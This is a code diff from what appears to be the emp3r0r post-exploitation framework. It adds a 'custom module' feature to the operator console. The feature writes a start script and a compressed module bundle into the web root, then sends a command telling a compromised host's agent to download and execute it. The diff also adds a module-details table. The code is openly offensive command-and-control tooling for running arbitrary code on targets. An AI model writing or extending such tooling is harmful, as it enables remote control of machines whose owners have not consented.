@@ -5,8 +5,12 @@ import (
 	"fmt"
 	"io/ioutil"
 	"strconv"
+	"strings"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	"github.com/olekukonko/tablewriter"
 )
 
 // ModConfig config.json of a module
@@ -33,8 +37,83 @@ type ModConfig struct {
 	Options map[string][]string `json:"options"`
 }
 
+// stores module configs
+var ModuleConfigs = make(map[string]ModConfig, 1)
+
 // moduleCustom run a custom module
 func moduleCustom() {
+	start_sh := WWWRoot + CurrentMod + ".sh"
+	config, exists := ModuleConfigs[CurrentMod]
+	if !exists {
+		CliPrintError("Config of %s does not exist", CurrentMod)
+		return
+	}
+	for opt, val := range config.Options {
+		val[0] = Options[opt].Val
+	}
+
+	// most of the time, start.sh is the only file changing
+	// and it's very small, so we host it for agents to download
+	err = genStartScript(&config, start_sh)
+	if err != nil {
+		CliPrintError("Generating start.sh: %v", err)
+		return
+	}
+
+	// compress module files
+	tarball := WWWRoot + CurrentMod + ".tar.bz2"
+	err = util.TarBz2(ModuleDir+CurrentMod, tarball)
+	if err != nil {
+		CliPrintError("Compressing %s: %v", CurrentMod, err)
+		return
+	}
+
+	// tell agent to download and execute this module
+	checksum := tun.SHA256SumFile(tarball)
+	cmd := fmt.Sprintf("!custom_module %s %s", CurrentMod, checksum)
+	err = SendCmdToCurrentTarget(cmd, "")
+	if err != nil {
+		CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
+	}
+}
+
+// Print module meta data
+func ModuleDetails(modName string) {
+	config, exists := ModuleConfigs[modName]
+	if !exists {
+		return
+	}
+
+	// build table
+	tdata := [][]string{}
+	tableString := &strings.Builder{}
+	table := tablewriter.NewWriter(tableString)
+	table.SetHeader([]string{"Name", "Exec", "Platform", "Author", "Date", "Comment"})
+	table.SetBorder(true)
+	table.SetRowLine(true)
+	table.SetAutoWrapText(true)
+
+	// color
+	table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})
+
+	table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
+		tablewriter.Colors{tablewriter.FgBlueColor},
+		tablewriter.Colors{tablewriter.FgBlueColor},
+		tablewriter.Colors{tablewriter.FgBlueColor},
+		tablewriter.Colors{tablewriter.FgBlueColor},
+		tablewriter.Colors{tablewriter.FgBlueColor})
+
+	// fill table
+	tdata = append(tdata, []string{config.Name, config.Exec, config.Platform, config.Author, config.Date, config.Comment})
+	table.AppendBulk(tdata)
+	table.Render()
+	out := tableString.String()
+	CliPrintInfo("Module details:\n%s", out)
 }
 
 // scan custom modules in ModuleDir,
@@ -65,6 +144,7 @@ func InitModules() {
 			CliPrintWarning("Loading config from %s: %v", config.Name, err)
 			continue
 		}
+		ModuleConfigs[config.Name] = *config
 		CliPrintInfo("Loaded module %s", strconv.Quote(config.Name))
 	}
 	CliPrintInfo("Loaded %d modules", len(ModuleHelpers))
@@ -86,6 +166,18 @@ func readModCondig(file string) (pconfig *ModConfig, err error) {
 	}
 	pconfig = &config
 	return
+}
+
+// genStartScript read config.json of a module
+func genStartScript(config *ModConfig, outfile string) (err error) {
+	data := ""
+	for opt, val_help := range config.Options {
+		data = fmt.Sprintf("%s %s=%s ", data, opt, val_help[0])
+	}
+	data = fmt.Sprintf("%s ./%s ", data, config.Exec) // run with environment vars
+
+	// write config.json
+	return ioutil.WriteFile(outfile, []byte(data), 0600)
 }
 
 func updateModuleHelp(config *ModConfig) error {
